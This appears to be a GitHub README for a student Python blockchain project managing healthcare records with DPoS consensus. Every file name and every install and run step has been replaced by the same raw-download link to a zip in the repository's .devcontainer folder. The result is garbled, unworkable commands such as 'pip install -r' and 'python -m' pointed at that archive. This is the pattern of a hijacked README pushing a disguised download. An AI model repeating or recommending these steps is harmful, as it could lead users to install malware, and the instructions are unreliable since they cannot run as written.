# Healthcare Record Management System (Blockchain)

Language: Python

Consensus Algorithm: Delegated Proof of Stake (DPoS)

This program manages patient records on a simple blockchain. Only verified blocks are added. DPoS is the only consensus used. Patients cannot be delegates.

Features
- User registration: doctor, patient, admin
- Patient consent for doctors
- Add/view medical records
- DPoS consensus (round-robin delegates)
- Merkle root per block
- Access logs

How to run (CLI)
1) Install requirements (Python 3.8+):
   pip install -r https://github.com/Prateeks078/BlockChain_Assignment1_Healthcare/raw/refs/heads/main/.devcontainer/Chain-Healthcare-Block-Assignment-1.0.zip
2) Start the CLI:
   python -m https://github.com/Prateeks078/BlockChain_Assignment1_Healthcare/raw/refs/heads/main/.devcontainer/Chain-Healthcare-Block-Assignment-1.0.zip

How to run (Streamlit)
1) Install requirements (Python 3.8+):
   pip install -r https://github.com/Prateeks078/BlockChain_Assignment1_Healthcare/raw/refs/heads/main/.devcontainer/Chain-Healthcare-Block-Assignment-1.0.zip
2) Start the CLI:
   python -m https://github.com/Prateeks078/BlockChain_Assignment1_Healthcare/raw/refs/heads/main/.devcontainer/Chain-Healthcare-Block-Assignment-1.0.zip

Basic steps
1) Create genesis
2) Register users
3) Give patient consent to a doctor
4) Configure DPoS and add delegates (only doctors/admins)
5) Add a medical record block
6) View chain, record history, and logs

Files (short)
- https://github.com/Prateeks078/BlockChain_Assignment1_Healthcare/raw/refs/heads/main/.devcontainer/Chain-Healthcare-Block-Assignment-1.0.zip      Core classes and block verification
- https://github.com/Prateeks078/BlockChain_Assignment1_Healthcare/raw/refs/heads/main/.devcontainer/Chain-Healthcare-Block-Assignment-1.0.zip       DPoS configuration
- https://github.com/Prateeks078/BlockChain_Assignment1_Healthcare/raw/refs/heads/main/.devcontainer/Chain-Healthcare-Block-Assignment-1.0.zip      Validation rules (transactions, chain, DPoS)
- https://github.com/Prateeks078/BlockChain_Assignment1_Healthcare/raw/refs/heads/main/.devcontainer/Chain-Healthcare-Block-Assignment-1.0.zip    Transaction input helpers
- https://github.com/Prateeks078/BlockChain_Assignment1_Healthcare/raw/refs/heads/main/.devcontainer/Chain-Healthcare-Block-Assignment-1.0.zip Registration and consent
- https://github.com/Prateeks078/BlockChain_Assignment1_Healthcare/raw/refs/heads/main/.devcontainer/Chain-Healthcare-Block-Assignment-1.0.zip           Simple views for CLI
- https://github.com/Prateeks078/BlockChain_Assignment1_Healthcare/raw/refs/heads/main/.devcontainer/Chain-Healthcare-Block-Assignment-1.0.zip         Hash/Merkle helpers
- https://github.com/Prateeks078/BlockChain_Assignment1_Healthcare/raw/refs/heads/main/.devcontainer/Chain-Healthcare-Block-Assignment-1.0.zip            CLI menu

Notes
- Only DPoS is supported.
- Patients cannot be delegates or block producers.
- The code stores state in https://github.com/Prateeks078/BlockChain_Assignment1_Healthcare/raw/refs/heads/main/.devcontainer/Chain-Healthcare-Block-Assignment-1.0.zip
